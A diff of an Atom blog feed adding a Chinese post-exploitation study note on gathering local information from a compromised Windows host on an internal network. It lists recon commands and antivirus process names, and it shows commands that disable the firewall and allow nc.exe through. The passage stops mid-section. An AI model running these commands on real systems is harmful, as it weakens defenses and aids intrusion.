@@ -8,8 +8,138 @@
     <author>
       <name>gsh3ll</name>
     </author>
-    <updated>2021-12-18T07:27:41.000Z</updated>
+    <updated>2021-12-19T07:27:41.000Z</updated>
     <category term="潜心学安全，低调求发展。" />
+    <entry>
+        <id>http://gsh3ll.top/2021/12/19/%E3%80%90%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%86%85%E7%BD%91%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
+        <title>【内网学习笔记】内网本地信息收集</title>
+        <link rel="alternate" href="http://gsh3ll.top/2021/12/19/%E3%80%90%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%86%85%E7%BD%91%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+        <content type="html">&lt;h1 id=&#34;内网本地信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网本地信息收集&#34;&gt;#&lt;/a&gt; 内网本地信息收集&lt;/h1&gt;
+&lt;p&gt;进入内网后，快速对当前机器角色的判断、当前机器所处网络环境的拓扑结构进行分析和判断、当前机器所在区域的判断。&lt;/p&gt;
+&lt;h2 id=&#34;手动收集本机信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#手动收集本机信息&#34;&gt;#&lt;/a&gt; 手动收集本机信息&lt;/h2&gt;
+&lt;p&gt;本机信息包括：操作系统、权限、内网 IP 地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话。&lt;/p&gt;
+&lt;h3 id=&#34;查看网络配置信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看网络配置信息&#34;&gt;#&lt;/a&gt; 查看网络配置信息&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ipconfig &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;all&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/images/%E3%80%90%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%86%85%E7%BD%91%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.assets/image.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;查看操作系统及版本信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看操作系统及版本信息&#34;&gt;#&lt;/a&gt; 查看操作系统及版本信息&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;systeminfo &lt;span class=&#34;token punctuation&#34;&gt;|&lt;/span&gt; findstr &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;B &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;C:&lt;span class=&#34;token string&#34;&gt;&#34;OS Name&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;C:&lt;span class=&#34;token string&#34;&gt;&#34;OS Version&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;英文系统&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;systeminfo &lt;span class=&#34;token punctuation&#34;&gt;|&lt;/span&gt;  findstr &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;B &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;C:&lt;span class=&#34;token string&#34;&gt;&#34;OS 名称&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;C:&lt;span class=&#34;token string&#34;&gt;&#34;OS 版本&#34;&lt;/span&gt;   &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;中文系统&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看系统体系结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看系统体系结构&#34;&gt;#&lt;/a&gt; 查看系统体系结构&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;PROCESSOR_ARCHITECTURE&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看系统所有环境变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看系统所有环境变量&#34;&gt;#&lt;/a&gt; 查看系统所有环境变量&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看安装的软件及版本-路径等&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看安装的软件及版本-路径等&#34;&gt;#&lt;/a&gt; 查看安装的软件及版本、路径等&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic product get name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;version&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;利用powershell命令收集软件信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用powershell命令收集软件信息&#34;&gt;#&lt;/a&gt; 利用 powershell 命令收集软件信息&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;powershell &#34;&lt;span class=&#34;token function&#34;&gt;Get-WmiObject&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; Win32_product &lt;span class=&#34;token punctuation&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;Select-Object&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;property name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;version&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查询本机服务信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询本机服务信息&#34;&gt;#&lt;/a&gt; 查询本机服务信息&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic service list brief&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查询进程列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询进程列表&#34;&gt;#&lt;/a&gt; 查询进程列表&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;tasklist 或者tasklist &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;v&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;进程&lt;/th&gt;
+&lt;th&gt;软件名称&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;360sd.exe&lt;/td&gt;
+&lt;td&gt;360 杀毒&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;360tray.exe&lt;/td&gt;
+&lt;td&gt;360 实时保护&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ZhuDongFangYu.exe&lt;/td&gt;
+&lt;td&gt;360 主动防御&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;KSafeTray.exe&lt;/td&gt;
+&lt;td&gt;金山卫士&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;SafeDogUpdateCenter.exe&lt;/td&gt;
+&lt;td&gt;服务器安全狗&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;McAfee McShield.exe&lt;/td&gt;
+&lt;td&gt;McAfee&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;egui.exe&lt;/td&gt;
+&lt;td&gt;NOD32&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;AVP.exe&lt;/td&gt;
+&lt;td&gt;卡巴斯基&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;avguard.exe&lt;/td&gt;
+&lt;td&gt;小红伞&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;bdagent.exe&lt;/td&gt;
+&lt;td&gt;BitDefender&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;查看进程信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看进程信息&#34;&gt;#&lt;/a&gt; 查看进程信息&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic &lt;span class=&#34;token keyword&#34;&gt;process&lt;/span&gt; list brief&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看启动程序信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看启动程序信息&#34;&gt;#&lt;/a&gt; 查看启动程序信息&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic startup get command&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;caption&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看任务计划&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看任务计划&#34;&gt;#&lt;/a&gt; 查看任务计划&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;schtasks &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;query &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;fo LIST &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;v&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看主机开机时间&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看主机开机时间&#34;&gt;#&lt;/a&gt; 查看主机开机时间&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net statistics workstation&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看用户列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看用户列表&#34;&gt;#&lt;/a&gt; 查看用户列表&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net user&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看指定用户的信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看指定用户的信息&#34;&gt;#&lt;/a&gt; 查看指定用户的信息&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net user xxx&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;获取本地管理员通常包括域用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取本地管理员通常包括域用户&#34;&gt;#&lt;/a&gt; 获取本地管理员（通常包括域用户）&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net localgroup administrators&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看当前在线用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看当前在线用户&#34;&gt;#&lt;/a&gt; 查看当前在线用户&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;query user &lt;span class=&#34;token punctuation&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;|&lt;/span&gt; qwinsta&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;列出或断开本地计算机与所连接的计算机的会话&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#列出或断开本地计算机与所连接的计算机的会话&#34;&gt;#&lt;/a&gt; 列出或断开本地计算机与所连接的计算机的会话&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net session&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查询端口列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询端口列表&#34;&gt;#&lt;/a&gt; 查询端口列表&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netstat &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ano&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看补丁列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看补丁列表&#34;&gt;#&lt;/a&gt; 查看补丁列表&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;systeminfo&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查看安装在系统的补丁&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看安装在系统的补丁&#34;&gt;#&lt;/a&gt; 查看安装在系统的补丁&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic qfe get Caption&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;Description&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;HotFixID&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;InstalledOn&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查询本机共享列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询本机共享列表&#34;&gt;#&lt;/a&gt; 查询本机共享列表&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net share&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;利用wmic查看共享列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用wmic查看共享列表&#34;&gt;#&lt;/a&gt; 利用 wmic 查看共享列表&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic share get name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;status&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/images/%E3%80%90%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%86%85%E7%BD%91%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.assets/image_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;查询路由表及所有可用接口的arp-缓存表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询路由表及所有可用接口的arp-缓存表&#34;&gt;#&lt;/a&gt; 查询路由表及所有可用接口的 ARP 缓存表&lt;/h3&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;route pring&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;查询防火墙相关配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询防火墙相关配置&#34;&gt;#&lt;/a&gt; 查询防火墙相关配置&lt;/h3&gt;
+&lt;h4 id=&#34;关闭防火墙&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关闭防火墙&#34;&gt;#&lt;/a&gt; 关闭防火墙&lt;/h4&gt;
+&lt;p&gt;Windows Server2003 以及之前版本&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh firewall &lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt; opmode disable&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Windows Server2003 之后的版本&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh advfirewall &lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt; allprofiles state off&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;查看防火墙配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看防火墙配置&#34;&gt;#&lt;/a&gt; 查看防火墙配置&lt;/h4&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh firewall show config&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;修改防火墙配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改防火墙配置&#34;&gt;#&lt;/a&gt; 修改防火墙配置&lt;/h4&gt;
+&lt;p&gt;Windows Server2003 以及之前版本&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh firewall add allowedprogram c:\nc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token string&#34;&gt;&#34;allow nc&#34;&lt;/span&gt; enable&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Windows Server2003 之后的版本&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;允许指定程序进入&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh advfirewall firewall add rule name=&lt;span class=&#34;token string&#34;&gt;&#34;pass nc&#34;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt;=in action=allow program=&lt;span class=&#34;token string&#34;&gt;&#34;C: \nc.exe&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;允许指定程序退出&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh advfirewall firewall add rule name=&lt;span class=&#34;token string&#34;&gt;&#34;Allow nc&#34;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt;=out action=allow program=&lt;span class=&#34;token string&#34;&gt;&#34;C: \nc.exe&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;允许 3389 端口放行&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh advfirewall firewall add rule name=&lt;span class=&#34;token string&#34;&gt;&#34;Remote Desktop&#34;&lt;/span&gt; protocol=TCP &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt;=in localport=3389 action=allow&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;自定义防火墙日志的存储位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自定义防火墙日志的存储位置&#34;&gt;#&lt;/a&gt; 自定义防火墙日志的存储位置&lt;/h4&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netsh advfirewall &lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt; currentprofile logging filename &lt;span class=&#34;token string&#34;&gt;&#34;C:\windows\temp\fw.log&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;计算机代理配置情况&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#计算机代理配置情况&#34;&gt;#&lt;/a&gt; 计算机代理配置情况&lt;/h4&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;reg query &lt;span class=&#34;token string&#34;&gt;&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;查询并开启远程连接服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询并开启远程连接服务&#34;&gt;#&lt;/a&gt; 查询并开启远程连接服务&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;查看远程连接端口（连接的端口为 0xd3d，转换后为 3389）&lt;/p&gt;
